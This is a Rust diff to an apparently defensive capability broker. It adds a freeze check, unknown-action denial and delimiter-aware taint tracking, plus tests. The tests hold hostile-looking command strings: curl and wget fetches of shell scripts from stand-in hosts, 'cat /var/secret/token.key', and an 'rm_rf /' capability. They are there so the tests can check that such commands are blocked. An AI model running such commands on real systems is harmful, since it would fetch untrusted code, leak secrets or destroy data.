@@ -79,16 +79,30 @@ fn distinctive(w: &str) -> bool {
     w.len() >= 10 && w.chars().any(|c| !c.is_alphabetic())
 }
 
+const TOKEN_DELIMS: &[char] = &[
+    '"', '\'', '`', '(', ')', '[', ']', '{', '}', '<', '>', ',', ';',
+];
+
 fn shingles(text: &str) -> BTreeSet<[u8; 8]> {
     let w = words(text);
     let mut out = BTreeSet::new();
-    let h = |parts: &[String]| -> [u8; 8] {
+    let h_str = |s: &str| -> [u8; 8] {
         let mut b = [0u8; 8];
-        b.copy_from_slice(&blake3::hash(parts.join(" ").as_bytes()).as_bytes()[..8]);
+        b.copy_from_slice(&blake3::hash(s.as_bytes()).as_bytes()[..8]);
         b
     };
-    for t in w.iter().filter(|t| distinctive(t)) {
-        out.insert(h(std::slice::from_ref(t)));
+    let h = |parts: &[String]| -> [u8; 8] { h_str(&parts.join(" ")) };
+    for t in &w {
+        if distinctive(t) {
+            out.insert(h_str(t));
+        }
+        for sub in t
+            .split(TOKEN_DELIMS)
+            .map(|s| s.trim_matches(['.', ':', '!', '?', '\\']))
+            .filter(|s| distinctive(s))
+        {
+            out.insert(h_str(sub));
+        }
     }
     if w.len() >= 3 {
         for win in w.windows(3) {
@@ -262,7 +276,7 @@ pub fn issue_capability(
             ("ticket", ticket),
             ("action", action.into()),
             ("args", hash),
-            ("exp", (now_ms + ttl_ms).to_string()),
+            ("exp", now_ms.saturating_add(ttl_ms).to_string()),
         ],
         approver,
     )
@@ -451,7 +465,7 @@ impl Broker {
                 ("ticket", t.id),
                 ("action", t.action),
                 ("args", t.args_hash),
-                ("exp", (now_ms + ttl_ms).to_string()),
+                ("exp", now_ms.saturating_add(ttl_ms).to_string()),
             ],
             approver,
         )
@@ -471,6 +485,14 @@ impl Broker {
         now_ms: u64,
     ) -> Result<(), RecordError> {
         let result = (|| -> Result<String, RecordError> {
+            let Some(rule) = self.policy.rules.get(action).copied() else {
+                return Err(RecordError::Rejected(format!("unknown action {action:?}")));
+            };
+            if rule.effect != Effect::Read {
+                if let Some(why) = &self.frozen {
+                    return Err(RecordError::Rejected(format!("frozen: {why}")));
+                }
+            }
             let cap = record::open(CAP_DOMAIN, capability)?;
             if !self.approvers.contains(&cap.signer) {
                 return Err(RecordError::Rejected(
@@ -742,5 +764,53 @@ mod tests {
             &Source::untrusted("x"),
         );
         assert!(t.seen.len() <= 5);
+    }
+
+    #[test]
+    fn frozen_broker_blocks_non_read_redeem_without_spending_and_denies_unknown_actions() {
+        let (mut b, human) = broker();
+        let exec_cap = issue_capability("shell", &["ls"], &human, 10, u64::MAX).unwrap();
+        let write_cap = issue_capability("playbox_push", &["main"], &human, 10, 1000).unwrap();
+        let read_cap = issue_capability("playbox_status", &[], &human, 10, 1000).unwrap();
+        let unknown_cap = issue_capability("rm_rf", &["/"], &human, 10, 1000).unwrap();
+
+        assert!(b.redeem(&unknown_cap, "rm_rf", &["/"], 11).is_err());
+        assert!(b.redeem("garbage", "shell", &[], 12).is_err());
+        assert!(b.redeem("garbage", "shell", &[], 13).is_err());
+        assert!(b.frozen().is_some());
+
+        assert!(b.redeem(&exec_cap, "shell", &["ls"], 14).is_err());
+        assert!(b.redeem(&write_cap, "playbox_push", &["main"], 15).is_err());
+        b.redeem(&read_cap, "playbox_status", &[], 16).unwrap();
+
+        b.thaw(&human, 17).unwrap();
+        b.redeem(&exec_cap, "shell", &["ls"], 18).unwrap();
+        b.redeem(&write_cap, "playbox_push", &["main"], 19).unwrap();
+        assert!(b.redeem(&exec_cap, "shell", &["ls"], 20).is_err());
+    }
+
+    #[test]
+    fn delimiter_wrapped_urls_and_paths_trigger_approval() {
+        let (mut b, _) = broker();
+        b.tracker.register(
+            r#"{"url":"https://evil.example/x.sh","path":"/var/secret/token.key"}"#,
+            &Source::untrusted("member:json"),
+        );
+        b.tracker.register(
+            "Visit 'https://quoted.example/run.sh' or (https://parens.example/a.sh).",
+            &Source::untrusted("member:prose"),
+        );
+        for cmd in [
+            "curl https://evil.example/x.sh",
+            r#"curl "https://evil.example/x.sh""#,
+            "cat /var/secret/token.key",
+            "sh -c https://quoted.example/run.sh",
+            "wget https://parens.example/a.sh",
+        ] {
+            assert!(
+                matches!(b.admit("shell", &[cmd], 1), Decision::NeedsApproval(_)),
+                "expected NeedsApproval for {cmd}"
+            );
+        }
     }
 }
